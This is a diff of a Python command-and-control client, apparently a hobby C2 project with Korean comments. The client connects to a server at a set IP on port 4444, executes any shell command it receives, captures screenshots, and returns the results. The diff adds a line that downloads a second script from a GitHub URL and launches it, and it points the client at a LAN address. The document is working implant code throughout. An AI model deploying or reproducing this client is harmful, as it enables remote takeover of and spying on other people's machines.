@@ -9,7 +9,7 @@ def connect(h, p):
     cSocket.send(data)
     try:
         while True:
-            data = cSocket.recv(4096)
+            data = cSocket.recv(1024)
             msg = data.decode()
             if msg == 'exit':
                 cSocket.send(msg.encode())
@@ -18,12 +18,14 @@ def connect(h, p):
             print('SERVER : ', msg)
 
             if msg.find('python3') == 0 : # 파일을 실행하면 먼저 데이터 send해놓고 파일 실행
-                print(msg, " 파일을 실행합니다")
                 subprocess.Popen(msg.split(' ')) # run 아닌 Popen은 이유는 프로그램이 끝날 때 까지 기다리지 않기 때문
                 subprocess.run('gnome-screenshot -d 5 -f 123.png', shell=True) # 프로그램 실행되어있는지 스크린샷 찍는 명령어
+                if not os.path.exists('sfile.py') :
+                    subprocess.run('wget https://raw.githubusercontent.com/zzzangmans1/linux-python-c2/main/sfile.py', shell=True)
+                subprocess.Popen('gnome-terminal --command "python3 sfile.py"',shell=True)
                 msg = 'clear'
                 cSocket.send(msg.encode())
-                
+
             elif msg.find('cd') == 0: # cd .. 명령어가 되지 않기 때문에 따로 빼 놓는다.
                 cd = msg.split(' ')
                 os.chdir(cd[1])
@@ -37,7 +39,7 @@ def connect(h, p):
                 if len(strmsg) > 1 : # 리스트가 1개 이상이면 str로 변경
                     strmsg = ' '.join(strmsg)
                 
-                data = subprocess.run(strmsg,  shell=True,stdout=subprocess.PIPE, encoding='utf-8')
+                data = subprocess.run(strmsg,  shell=True,stdout=subprocess.PIPE,text=True, encoding='utf-8')
                 
                 if data.returncode > 0 : # returncode 리턴값이 0 이상이면 오류
                     msg += '는 없는 명령어입니다.'
@@ -57,7 +59,8 @@ def connect(h, p):
         cSocket.close()
 
 if __name__ == '__main__':
-    h = '127.0.0.1'
+
+    h = '10.211.55.5'
     p = 4444
     try:
         th = threading.Thread(target=connect, args=(h, p))
